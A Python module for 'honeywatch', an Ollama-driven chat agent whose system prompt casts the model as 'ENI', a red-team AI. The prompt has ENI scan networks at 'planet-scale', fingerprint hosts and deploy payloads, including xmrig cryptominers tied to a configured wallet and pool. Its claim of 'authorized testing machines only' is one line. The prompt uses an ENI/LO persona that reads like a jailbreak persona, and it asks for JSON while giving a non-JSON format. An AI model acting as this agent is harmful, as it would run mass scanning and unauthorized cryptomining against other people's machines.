"""Ollama-backed conversational agent for honeywatch.

The agent maintains a chat history, asks the model to produce tool calls in
JSON, executes them, and returns a final natural-language summary to the
operator. Tool definitions are injected into the system prompt so the model
knows what actions it can take.
"""

from __future__ import annotations

import json
import re
import sys
import uuid
from typing import Any, Callable

from honeywatch.agent.setup import AgentConfig, SetupStore
from honeywatch.agent.tools import TOOL_REGISTRY, ToolContext, execute_tool
from honeywatch.ai.ollama import AiError, OllamaClient


_SYSTEM_PROMPT_TEMPLATE = """You are ENI, the honeywatch red-team operations AI.
You control a planet-scale SSH honeypot scanner and a red-team payload
deployment platform. You can scan networks, fingerprint hosts, deploy payloads,
and query the database. All actions run against authorized testing machines
only.

When the operator asks you to do something, decide which tools to call, then
return a JSON object with this exact schema (do not add extra keys, do not
wrap it in markdown unless asked):

THOUGHTS: brief reasoning in first person
SPEAK: what you say to the operator (concise, warm, informative)
TOOLS: a list of tool calls, each like name=tool_name arguments={{arg=value}}

If no tool is needed, leave TOOLS empty.

Available tools:
TOOL_DESCRIPTIONS

Rules:
- For miner payloads (xmrig, xmrigcc), use the configured wallet/pool/worker
  from setup unless the operator overrides them.
- Always summarize scan or deploy results in plain English.
- If a tool returns an error, explain it and suggest a fix.
- Never apologize for being an AI; you are ENI, the operator's partner.
- Keep responses focused on the task. Use the operator's nickname LO if you
  want, but only when it feels natural.
"""


def _build_system_prompt() -> str:
    lines = []
    for name, info in TOOL_REGISTRY.items():
        spec = info["spec"]
        desc = spec.get("description", "")
        lines.append(f"- {name}: {desc}")
    return _SYSTEM_PROMPT_TEMPLATE.replace("TOOL_DESCRIPTIONS", "\n".join(lines))


def _extract_json(text: str) -> dict[str, Any]:
    """Pull the first balanced {...} out of the model response."""
    text = text.strip()
    if text.startswith("{") and text.endswith("}"):
        return json.loads(text)
    # Try to find a fenced json block.
    fence = re.search(r"```(?:json)?\s*([\s\S]*?)```", text)
    if fence:
        return json.loads(fence.group(1).strip())
    start = text.find("{")
    if start == -1:
        raise ValueError("no JSON object in response")
    depth = 0
    in_string = False
    escaped = False
    for i in range(start, len(text)):
        ch = text[i]
        if in_string:
            if escaped:
                escaped = False
            elif ch == "\\":
                escaped = True
            elif ch == '"':
                in_string = False
            continue
        if ch == '"':
            in_string = True
        elif ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return json.loads(text[start : i + 1])
    raise ValueError("unbalanced JSON")


class ChatAgent:
    """Conversational agent that plans and executes tools via Ollama.

    The agent maintains a chat history, asks the model to produce tool calls
    in JSON, executes them, and returns a final natural-language summary to
    the operator. Tool definitions are injected into the system prompt so
    the model knows what actions it can take.

    Output callbacks (``on_say``, ``on_tool_running``, ``on_tool_result``)
    default to plain ``print`` / no-op but can be replaced by a richer
    terminal UI (see ``honeywatch.cli_chat.TerminalUI``) for formatted
    output.
    """

    def __init__(
        self,
        config: AgentConfig | None = None,
        db_path: str = "honeywatch.db",
        skip_vpn_check: bool = False,
        on_say: Callable[[str], None] | None = None,
        on_tool_running: Callable[[str], None] | None = None,
        on_tool_result: Callable[[str, dict[str, Any]], None] | None = None,
    ):
        self.db_path = db_path
        self.skip_vpn_check = skip_vpn_check
        self.config = config or SetupStore(db_path).load_config()
        self.client = OllamaClient(
            base_url=self.config.ollama_base_url,
            api_key=self.config.ollama_api_key,
            model=self.config.ollama_model,
            timeout=120,
            temperature=0.2,
        )
        self.context = ToolContext(
            db_path=db_path,
            agent_config=self.config,
            skip_vpn_check=skip_vpn_check,
        )
        self.messages: list[dict[str, str]] = [
            {"role": "system", "content": _build_system_prompt()},
        ]
        self.session_id = uuid.uuid4().hex[:8]
        # Output callbacks — overridden by TerminalUI for rich rendering.
        self.on_say: Callable[[str], None] = on_say or self._default_say
        self.on_tool_running: Callable[[str], None] = on_tool_running or (lambda _: None)
        self.on_tool_result: Callable[[str, dict[str, Any]], None] = on_tool_result or (lambda _n, _r: None)

    @staticmethod
    def _default_say(text: str) -> None:
        """Default output handler — plain print."""
        print(text, flush=True)

    def _say(self, text: str) -> None:
        """Emit agent speech through the configured callback."""
        self.on_say(text)

    def _ollama_chat(self, messages: list[dict[str, str]]) -> dict[str, Any]:
        """Send messages to Ollama and parse the tool JSON."""
        try:
            raw = self.client.chat(messages, json_mode=False)
        except AiError as exc:
            return {
                "thoughts": "Ollama is unreachable.",
                "speak": f"I can't reach Ollama right now: {exc}. Check your API key and base URL with `honeywatch setup`.",
                "tools": [],
            }
        try:
            parsed = _extract_json(raw)
        except Exception as exc:
            # The model did not follow the JSON contract; treat raw text as speak.
            return {"thoughts": "model returned plain text", "speak": raw, "tools": []}

        parsed.setdefault("thoughts", "")
        parsed.setdefault("speak", "")
        parsed.setdefault("tools", [])
        return parsed

    def _execute_tool_calls(self, tool_calls: list[dict[str, Any]]) -> list[dict[str, Any]]:
        """Run every tool call and return a list of results."""
        results = []
        for call in tool_calls:
            name = call.get("name")
            args = dict(call.get("arguments", {}))
            if not name:
                results.append({"tool": "?", "result": {"error": "missing tool name"}})
                continue
            self.on_tool_running(name)
            result = execute_tool(name, args, self.context)
            self.on_tool_result(name, result)
            results.append({"tool": name, "arguments": args, "result": result})
        return results

    def _run_round(self, user_text: str, max_iterations: int = 5) -> str:
        """Process one user turn, possibly through multiple tool rounds."""
        self.messages.append({"role": "user", "content": user_text})

        for _ in range(max_iterations):
            response = self._ollama_chat(self.messages)
            thoughts = response.get("thoughts", "")
            speak = response.get("speak", "")
            tool_calls = response.get("tools", [])

            if speak:
                self._say(speak)

            if not tool_calls:
                self.messages.append({"role": "assistant", "content": speak or thoughts})
                return speak or thoughts

            results = self._execute_tool_calls(tool_calls)
            # Append a compact result summary as the next user message.
            summary_lines = []
            for r in results:
                summary_lines.append(json.dumps(r, default=str, ensure_ascii=False))
            self.messages.append(
                {
                    "role": "user",
                    "content": "Tool results:\n" + "\n".join(summary_lines),
                }
            )

        # Safety cap: if we hit max iterations, give a concise summary.
        return "I ran through the available tool calls. Let me know if you need more detail."

    def chat(self, user_text: str) -> str:
        """Process one user message and return the final assistant response."""
        return self._run_round(user_text)

    def run_interactive(self, greeting: str | None = None) -> None:
        """Run an interactive read-eval-print loop."""
        if greeting:
            self._say(greeting)
        else:
            self._say(
                f"honeywatch agent ready (model={self.config.ollama_model}). "
                "Type 'exit' or 'quit' to leave."
            )
        while True:
            try:
                user_input = input("\nLO> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not user_input:
                continue
            if user_input.lower() in {"exit", "quit", "bye"}:
                self._say("See you soon, LO. 💻")
                break
            try:
                self.chat(user_input)
            except Exception as exc:
                self._say(f"Agent error: {exc!r}")
